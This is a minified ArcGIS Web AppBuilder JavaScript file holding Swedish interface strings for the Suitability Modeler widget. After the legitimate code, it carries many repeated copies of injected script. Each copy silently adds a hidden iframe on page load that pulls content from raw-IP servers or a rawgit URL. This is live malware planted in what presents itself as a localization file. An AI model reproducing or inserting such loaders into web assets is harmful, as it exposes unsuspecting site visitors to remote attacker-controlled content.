// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define({"widgets/SuitabilityModeler/nls/strings":{_widgetLabel:"Suitability Modeler",general:{clear:"Rensa",cancel:"Avbryt",save:"K\u00f6r",saveAs:"Exportera"},saveModel:{save:"Exportera",title:"Titel: ",summary:"Sammanfattning: ",description:"Beskrivning: ",tags:"Etiketter: ",folder:"Mapp: ",homeFolderPattern:"{username} (hem)",failed:"Exporten misslyckades."},util:{colorRamp:{1:"Extremt l\u00e5g",2:"Mycket l\u00e5g",3:"L\u00e5g",4:"L\u00e5g medium",5:"Medium",6:"H\u00f6g medium",7:"H\u00f6g",8:"Mycket h\u00f6g",
9:"Extremt h\u00f6g",low:"L\u00e5g",high:"H\u00f6g",tipPattern:"{label} ({value})",flipCaption:"V\u00e4nd"}},wro:{caption:"Suitability Modeler",browsePrompt:"Viktad \u00f6verlagringstj\u00e4nst",selectLayersCaption:"V\u00e4lj lager",selectLayers:"Lager",designModelCaption:"Designa modell",designModel:"Designa modell",transparency:"Transparens",visible:"Synlig",total:"Totalt",unableToLoad:"Det gick inte att l\u00e4sa in modellen.",projectNotOpen:"Ett projekt \u00e4r inte \u00f6ppet.",readMore:"L\u00e4s mer",
validation:{validating:"Validerar ...",invalidItemCaption:"Varning fr\u00e5n viktad \u00f6verlagringstj\u00e4nst",notAnImageService:"Objektet \u00e4r inte en bildtj\u00e4nst.",notAWroService:"Objektet \u00e4r inte en viktad \u00f6verlagringstj\u00e4nst.",undefinedUrl:"Objektets URL \u00e4r inte definierad.",inaccessible:"Tj\u00e4nsten \u00e4r inte tillg\u00e4nglig.",generalError:"Det gick inte att \u00f6ppna objektet.",missingFieldPattern:"{field} \u00e4r ett obligatoriskt f\u00e4lt",notAllowRasterFunction:"allowRasterFunction m\u00e5ste vara inst\u00e4lld till sant",
notNearestResampling:"defaultResamplingMethod m\u00e5ste vara N\u00e4rmaste",notIsWeightedOverlayProp:"Nyckelegenskapen IsWeightedOverlay m\u00e5ste vara inst\u00e4lld till sant",invalidLink:"URL:en \u00e4r ogiltig. Det gick inte att \u00f6ppna webbplatsen f\u00f6r det valda lagret.",unexpectedError:"Ett ov\u00e4ntat tillst\u00e5nd har uppst\u00e5tt.",rangeMessage:"V\u00e4rdet m\u00e5ste vara mellan ${0} och ${1}",rangeMessage100:"V\u00e4rdet m\u00e5ste vara mellan 0 och 100",maxLayers:"Tj\u00e4nsten till\u00e5ter h\u00f6gst ${0} lager. Du m\u00e5ste f\u00f6rst ta bort ett lager innan du l\u00e4gger till ett nytt.",
notFound:"Lagret ${0} hittades inte i den viktade \u00f6verlagringstj\u00e4nsten",wroServiceNotDefined:"Ingen viktad \u00f6verlagringstj\u00e4nst har definierats f\u00f6r modellen.",overlayLayerOutputInvalid:"\u00d6verlagringslagrets [${0}] ommappningsintervallers [${1}] utdatav\u00e4rde saknas eller \u00e4r ogiltigt",overlayLayerInputInvalid:"\u00d6verlagringslagrets [${0}] ommappningsintervallers [${1}] min/max-indatav\u00e4rde saknas eller \u00e4r ogiltigt",overlayLayerRangesMissing:"\u00d6verlagringslagret [${0}] saknar ommappningsintervaller",
overlayLayerWeight:"\u00d6verlagringslagrets vikter m\u00e5ste sammanlagt vara 100",overlayLayerRequired:"Minst ett \u00f6verlagringslager \u00e4r obligatoriskt",overlayLayerNotDefined:"\u00d6verlagringslager \u00e4r inte definierade",requiresColormap:"Den h\u00e4r rasterfunktionen kr\u00e4ver ett f\u00e4rgschema, men modellen har inte en giltig definition av f\u00e4rgschema",createModelError:"Fel n\u00e4r modell skapades",invalidModel:"Modellen \u00e4r inte giltig",imageServiceNotDefined:"Bildtj\u00e4nstlagret \u00e4r inte definierat",
imageLayerNotDefined:"Bildtj\u00e4nstlagret \u00e4r inte definierat",histogramNotDefined:"Ingen histogramfunktion f\u00f6r viktad \u00f6verlagring definierad."},colorRampLabel:{"Green Yellow Red":"Gr\u00f6nt gult r\u00f6tt","Red Yellow Green":"R\u00f6tt gult gr\u00f6nt","Yellow to Dark Red":"Gult till m\u00f6rkr\u00f6tt","Dark Red to Yellow":"M\u00f6rkr\u00f6tt till gult","Light Gray to Dark Gray":"Ljusgr\u00e5tt till m\u00f6rkgr\u00e5tt","Dark Gray to Light Gray":"M\u00f6rkgr\u00e5tt till ljusgr\u00e5tt",
"Light Brown to Dark Brown":"Ljusbrunt till m\u00f6rkbrunt","Dark Brown to Light Brown":"M\u00f6rkbrunt till ljusbrunt","Full Spectrum - Bright Red to Blue":"Fullt spektrum \u2013 Klarr\u00f6tt till bl\u00e5tt","Full Spectrum - Bright Blue to Red":"Fullt spektrum \u2013 Klarbl\u00e5tt till r\u00f6tt","Partial Spectrum - Yellow to Blue":"Delspektrum \u2013 Gult till bl\u00e5tt","Partial Spectrum - Blue to Yellow":"Delspektrum \u2013 Bl\u00e5tt till gult","Yellow-Green to Dark Blue":"Gulgr\u00f6nt till m\u00f6rkbl\u00e5tt",
"Dark Blue to Yellow-Green":"M\u00f6rkbl\u00e5tt till gulgr\u00f6nt","Cold to Hot Diverging":"Delar p\u00e5 sig fr\u00e5n kallt till varmt","Hot to Cold Diverging":"Delar p\u00e5 sig fr\u00e5n varmt till kallt","Surface - Low to High":"Yta \u2013 L\u00e5g till h\u00f6g","Surface - High to Low":"Yta \u2013 H\u00f6g till l\u00e5g"}},_localized:{}},"widgets/SuitabilityModeler/setting/nls/strings":{allowSaveAs:"Till\u00e5t export",startingState:"Starttillst\u00e5nd:",byUrl:"Tom modell",byItem:"F\u00f6rkonfigurerad modell",
imageServiceUrl:"URL till bildtj\u00e4nst",validate:"Validera",validating:"Validerar ...",validated:"Webbadressen \u00e4r giltig.",modelName:"Modell",selectModel:"V\u00e4lj",itemSelectorTitle:"V\u00e4lj en modell",ok:"OK",cancel:"Avbryt",description1:"Suitability Modeler hj\u00e4lper dig att hitta den b\u00e4sta platsen f\u00f6r en aktivitet, att f\u00f6ruts\u00e4ga riskk\u00e4nslighet och att identifiera platser d\u00e4r n\u00e5got kan intr\u00e4ffa. Med denna widget kan du kombinera och vikta olika lager s\u00e5 att du kan bed\u00f6ma flera faktorer samtidigt.",
description2:"Suitability Modeler anv\u00e4nder en snabb, webbaserad viktad raster\u00f6verlagring (WRO, weighted raster overlay) f\u00f6r att generera modeller fr\u00e5n en tj\u00e4nst. Du kan b\u00f6rja med en tom viktad raster\u00f6verlagringstj\u00e4nst eller en f\u00f6rkonfigurerad WRO-modell. V\u00e4lj lager, tilldela viktningar och justera lagerklassificeringsv\u00e4rden f\u00f6r att definiera din analys. K\u00f6r sedan Suitability Modeler, visualisera resultaten och spara eventuellt resultatet som ett objekt i din organisation/portal.",
description3:"L\u00e4s mer om GeoPlanner Suitability Modeler.",_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});